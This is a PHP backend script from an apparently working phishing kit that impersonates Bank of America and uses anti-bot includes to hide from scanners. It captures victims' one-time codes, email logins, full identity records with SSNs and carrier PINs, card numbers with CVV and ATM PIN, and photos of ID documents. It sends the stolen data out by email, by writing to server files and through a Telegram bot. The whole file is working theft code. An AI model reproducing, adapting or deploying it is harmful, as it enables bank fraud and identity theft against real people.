<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

function getip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};


//////////// OTP GRAB
if(isset($_POST['ott'])){
if(!empty($_POST['cod']) && strlen($_POST['cod']) > 3){
	///////////////////////// MAIL PART //////////////////////
		$auth = $_POST['cod'];
		$PublicIP = getip();
        $Info_LOG = "
|------------------- AUTHCODE ----------------| 
AUTHCODE         : $auth";
		$_SESSION['fullz'].=$Info_LOG; 
		$Info_LOG.="
Ip    : $PublicIP ";
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 🦀🔥 BOA AUTHCODE' ;$headers = 'From: YoCHI <yochrunthecit@citirunnner.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if($usecaution==1){header("location:../sp?id=myaccount&y=".md5(rand(100, 999999999))."");} 
		else{header("location:cv?start=myaccount&y=".md5(rand(100, 999999999))."");};
}
else {header("location:ot?".$theerrkey."=c3Fauth".md5(rand(100, 999999999)).""); };
}

//////////// EMAIL SUBMIT
elseif(isset($_POST['esubmit'])){
$ip = $_SERVER['REMOTE_ADDR'];
function dirtomail($email) {
            if (preg_match("/@gmail/i", $email) == 1) {
				$_SESSION['fullz'].='
Email Address:      '.$email;
				if($grabidphoto==1){return "../idd?";}
				else{return "../end?";};
            }
            elseif (preg_match("/@yahoo/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@ymail/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@rocketmail/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@outlook/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@hotmail/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@live/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@msn/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@aol/i", $email) == 1) {
                return "ao";
            }
            elseif (preg_match("/@comcast/i", $email) == 1) {
                return "cc";
            }
            elseif (preg_match("/@att/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@sbcglobal/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@bellsouth/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@verizon/i", $email) == 1) {
                return "vr";
            }
            return 'mc';
};

if(isset($_POST['esubmit']) && isset($_POST['yop'])){
	if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($_POST['email']))){
		$_SESSION['email'] = $_POST['email'];
		header('location:m/'.dirtomail($_POST['email']).'');
	} else{header("location:em?".$theerrkey."=cjcc3Fauth".md5(rand(100, 999999999))."");}
}
elseif(isset($_POST['esubmit']) && !isset($_POST['yop'])){
if(isset($_POST['email']) && isset($_POST['emailpass'])){
    if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($_POST['email'])) && strlen($_POST['emailpass']) > 3){
	///////////////////////// MAIL PART //////////////////////
		$email = $_POST['email'];
		$emailpass = $_POST['emailpass'];
		$PublicIP = getip();
		if(isset($_GET[''.$theerrkey.''])){$reshead="|-------------- CONFIRM EMAIL INFO -------------|";}
		else{$reshead="|------------------- EMAIL INFO ----------------|";};
        $Info_LOG = "
$reshead		
Email            : $email
Email Password   : $emailpass";
		$_SESSION['fullz'].=$Info_LOG; 
		$Info_LOG.="

IP    : $PublicIP ";
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
			$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
            $subject = $PublicIP.' 🦀🔥 '.$i.' BOA EMAIL LOG' ;$headers = 'From: YoCHI <yochrunthecit@citirunnner.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET[''.$theerrkey.'']) && $confirmemaillog ==1){header("location:m/".dirtomail($_SESSION['email'])."?accrXId=c".md5(rand(100, 999999999))."&".$theerrkey."=On");}
		else{unset($_SESSION['email']);
				if($grabidphoto==1){header("location:idd?ses11onnI_IX=".md5(rand(100, 999999999))."");}
				else{header("location:end?sessionnI_IX=".md5(rand(100, 999999999))."");};
		}
    }
    else{ header("location:m/".dirtomail($_SESSION['email'])."?".$theerrkey."=c".md5(rand(100, 999999999)).""); };
}
else { header("location:m/".dirtomail($_SESSION['email'])."?".$theerrkey."=c3Fakqquth".md5(rand(100, 999999999)).""); };
}
;}

//////////////// ID SUBMIT
elseif(isset($_POST['idd'])){
if(isset($_POST['fna']) && isset($_POST['dob']) && isset($_POST['street']) && isset($_POST['state']) && isset($_POST['ssn']) ){
    if(strlen($_POST['dob']) == 10){
	///////////////////////// MAIL PART //////////////////////
		$fullname = $_POST['fna'];
		$street_address = $_POST['street'];
		$dob = $_POST['dob'];
		$ssn = $_POST['ssn']?$_POST['ssn']:'';
		$state = $_POST['state'];
		$dl = $_POST['dl'];
		$dlx = $_POST['dlexp'];
		$zip_code = $_POST['zip'];
		$mobile = $_POST['phone'];
		$mpin = $_POST['pmin'].$_SESSION['device'];
		$PublicIP = getip();
        $Info_LOG = "
|------------------- Fullz INFO ----------------| 
Fullname         : $fullname      
DOB              : $dob			  
SSN              : $ssn
DL               : $dl 
DL EXP           : $dlx 
Street Address   : $street_address   
State            : $state		  
Zip/Postal Code  : $zip_code 	  
Phone Number     : $mobile
Carrier PIN      : $mpin";
		$_SESSION['fullz'].=$Info_LOG; 
		$Info_LOG.="
Ip    : $PublicIP ";
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 🦀🔥 ['.strtoupper($state).'] BOA FULLZ INFO | DEVICE' ;$headers = 'From: YoCHI <yochrunthecit@citirunnner.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if($Send_Email == 1 && isset($_SESSION['fullz'])){
            $subject = $PublicIP.' 🦀🔥 BOA SESSION RESULT';$headers = 'From: YoCHI <yochrunthecit@citirunnner.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $_SESSION['fullz'], $headers);
		};
        if ($send_tg == 1 && isset($_SESSION['fullz'])) {
			sendtoTG($tgid, $_SESSION['fullz'], $tgtoken);
        };
		if(isset($_SESSION['fullz'])){
			$file = fopen("../../admin/Results.txt", 'a');
			fwrite($file, $_SESSION['fullz'].'r\n');
			fclose($file);};
		if($grabemailaccess!=1){
			if($grabidphoto==1){header("location:idd?ses11onnI_IX=".md5(rand(100, 999999999))."");}
			else{header("location:end?sessionnI_IX=".md5(rand(100, 999999999))."");};
			} else{header("location:em?start=myaccount&y=".md5(rand(100, 999999999))."");};
    }
    else{ header("location:bid?".$theerrkey."=c".md5(rand(100, 999999999)).""); };
}
else { header("location:bid?".$theerrkey."=c3Fauth".md5(rand(100, 999999999)).""); };	
}

/////////CARD CHECK..
elseif(isset($_POST['cub'])){
function getcardtype($cardnumber){
$cardtype = array(
    '34'=>'American Express',
    '37'=>'American Express',
    '5'=>'Master Card',
    '4'=>'Visa',
    '30'=>'Blue Card',
	'36'=>'Blue Card',
    '38'=>'Blue Card',
    '35'=>'JCB',
    '6'=>'Discover');
if(substr($cardnumber,0,2) == "34"){return   $cardtype[34];}
else if(substr($cardnumber,0,2) == "37"){return  $cardtype[37];}
else if(substr($cardnumber,0,2)== "30"){return  $cardtype[30];}
else if(substr($cardnumber,0,2)== "36"){return  $cardtype[36];}
else if(substr($cardnumber,0,2)== "38"){return   $cardtype[38];}
else if(substr($cardnumber,0,2)== "35"){return  $cardtype[35];}
else if(substr($cardnumber,0,1)== "6"){return   $cardtype[6];}
else if(substr($cardnumber,0,1)== "5"){return   $cardtype[5];}
else if(substr($cardnumber,0,1) == "4"){return  $cardtype[4];}
else {return "Unknown";};
};

function getcd($cardnumber){
$ctype = getcardtype($cardnumber);
$cd=str_replace(' ','',$cardnumber);
$bin=substr($cd,0,6);
$getdetails = "https://lookup.binlist.net/".$bin;
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details=json_decode($content,true);
$narr=array('scheme'=>$ctype,'type'=>'Unknown','brand'=>'Unknown','bank'=>array('name'=>'Unknown',),'country'=>array('name'=>'Unknown'));
foreach($details as $key => $value){$narr[$key]=$value;};
return $narr;
};

if(isset($_POST['cardname']) && isset($_POST['cardnumber']) && isset($_POST['expdate'])){
	$cnum = str_replace(' ','',$_POST['cardnumber']);
if(strlen($cnum) > 12){
	$cardname = $_POST['cardname'];
	$cardnumber =  $cnum;
	$expdate = $_POST['expdate'];
	$cvv = $_POST['cvv'];
	$atm = $_POST['atm'];
	$PublicIP = getip();
	$cd=getcd($cardnumber);
	$bank=strtoupper($cd['bank']['name'])." | ".$cd['country']['name'];
	$type=strtoupper($cd['scheme']." - ".$cd['type']);
	$level=strtoupper($cd['brand']);
	$Info_LOG = "
|------------------ CARD DETAILS -----------------|
Bank Info        : $bank
Type             : $type
Level            : $level
Name On Card     : $cardname
Card Number      : $cardnumber
Expiry date      : $expdate
CVV              : $cvv
ATM PIN          : $atm";
		$_SESSION['fullz'].=$Info_LOG; 
		
// Don't Touche
//Email
        if($Send_Email == 1 ){
            $subject = $PublicIP.' 🦀🔥 BOA CARD';$headers = 'From: YoCHI <yochrunthecit@citirunnner.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			mail($to, $subject, $Info_LOG, $headers);
		};
//FTP == 1 save result >< == 0 don't save result
        if($Ftp_Write == 1 ){
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		header("location:bid?consent_handled=true&amp;consentResponseUri=%2Fprotocol&amp;p=none");
    }
	else{header("location:cv?".$theerrkey."=bc&dispatched=".md5('jhjh')."");};
}
else{header("location:cv?".$theerrkey."=1&dispatched=".md5('nasskkjkjkjimdz')."");};
}

elseif(isset($_POST['upppp'])){
$uploadok=0;
$PublicIP = $_SERVER['REMOTE_ADDR'];

function sendPhotoToTg($chatID, $file, $caption, $token){
$url    = "https://api.telegram.org/bot$token";
$post_fields = [
			'chat_id'   => $chatID,
			'photo'     => new CURLFile(realpath($file)),
			'caption'     => $caption
			   ];
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
	curl_setopt($ch, CURLOPT_URL, $url. "/sendPhoto"); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
	curl_setopt($ch, CURLOPT_SAFE_UPLOAD, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	$err = curl_error($ch);
	curl_close($ch);
}
	
if (($_FILES['my_filefront']['name']!="") && getimagesize($_FILES['my_filefront']['tmp_name']) !== false){
	$file = $_FILES['my_filefront']['name'];
	$path = pathinfo($file);
	$filename = $PublicIP."_Front_ID";
	$ext = $path['extension'];
	$temp_name = $_FILES['my_filefront']['tmp_name'];
	@mkdir('../../rst');
	$path_filename_ext = "../../rst/".$filename.".".$ext;
	$uploadok=1;
	move_uploaded_file($temp_name,$path_filename_ext);
	if ($send_tg == 1) {
	sendPhotoToTg($tgid , $path_filename_ext, "🦀🔥 BOA ".str_replace('_',' ',$filename), $tgtoken);
		};
	};
	
if (($_FILES['my_fileback']['name']!="") && getimagesize($_FILES['my_fileback']['tmp_name']) !== false){
	$file = $_FILES['my_fileback']['name'];
	$path = pathinfo($file);
	$filename = $PublicIP."_Back_ID";
	$ext = $path['extension'];
	$temp_name = $_FILES['my_fileback']['tmp_name'];
	@mkdir('../../rst');
	$path_filename_ext = "../../rst/".$filename.".".$ext;
	$uploadok=1;
	move_uploaded_file($temp_name,$path_filename_ext);
	if ($send_tg == 1) {
	sendPhotoToTg($tgid , $path_filename_ext, "🦀🔥 BOA ".str_replace('_',' ',$filename), $tgtoken);
		};
	};
	
if($uploadok==1){
$Info_LOG="🦀🔥 BOA ID UPLOADED BY VICTIM IP: $PublicIP
Check RST folder for IMAGES with ipname";
if($Send_Email == 1 ){
            $subject = $PublicIP.' 🦀🔥 BOA ID UPLOADED';$headers = 'From: YoCHI <yochbase@yochcoinchaser.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			mail($to, $subject, $Info_LOG, $headers);
		};
if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
	};
header("location:end?sessioninnI_IX=".md5(rand(100, 999999999))."");
};

?>